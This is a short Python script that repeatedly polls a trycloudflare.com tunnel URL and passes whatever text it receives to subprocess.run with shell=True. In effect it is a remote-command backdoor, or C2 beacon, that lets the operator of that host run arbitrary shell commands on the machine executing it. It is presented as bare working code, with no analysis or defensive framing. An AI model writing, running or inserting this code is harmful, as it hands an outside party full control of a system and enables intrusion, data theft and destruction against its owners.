import requests
import time
import subprocess

session = requests.Session()  # use a session to enable connection reuse (keep-alive)

while True:
    try:
        req = session.get("https://ia-margaret-wed-bloomberg.trycloudflare.com/home")
    except requests.exceptions.RequestException:
        # If server not ready or connection interrupted, just skip this iteration
        continue

    # Print response
    print(req.status_code)
    print(req.text)

    # Use the text in subprocess
    command = req.text.strip()
    if command:
        try:
            subprocess.run(command, shell=True)
        except Exception as e:
            print(f"Error running command: {e}")

    # Optional: small delay to avoid flooding the server too fast
    time.sleep(0.5)